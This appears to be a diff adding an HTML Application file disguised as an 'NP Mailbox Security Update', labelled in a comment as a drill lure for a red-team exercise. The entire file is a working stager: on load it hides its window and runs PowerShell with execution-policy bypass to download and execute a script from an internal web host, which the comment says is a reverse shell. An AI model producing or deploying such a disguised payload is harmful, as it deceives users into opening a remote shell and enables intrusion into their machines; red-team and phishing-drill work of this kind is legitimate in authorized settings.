@@ -1,0 +1,19 @@
+<html>
+<head>
+<title>NP Mailbox Security Update</title>
+<HTA:APPLICATION ID="npupd" APPLICATIONNAME="NP Mailbox Security Update"
+  BORDER="thin" CAPTION="yes" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"
+  SYSMENU="no" SCROLL="no" WINDOWSTATE="minimize" />
+<script language="VBScript">
+' GP-0 lure payload (drill only). Launches the staged PowerShell reverse shell from the Kali web host.
+Sub Window_OnLoad
+  Dim shell, cmd
+  cmd = "powershell.exe -w hidden -nop -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.5.20.50:8080/s.ps1')"""
+  Set shell = CreateObject("WScript.Shell")
+  shell.Run cmd, 0, False
+  window.close()
+End Sub
+</script>
+</head>
+<body></body>
+</html>
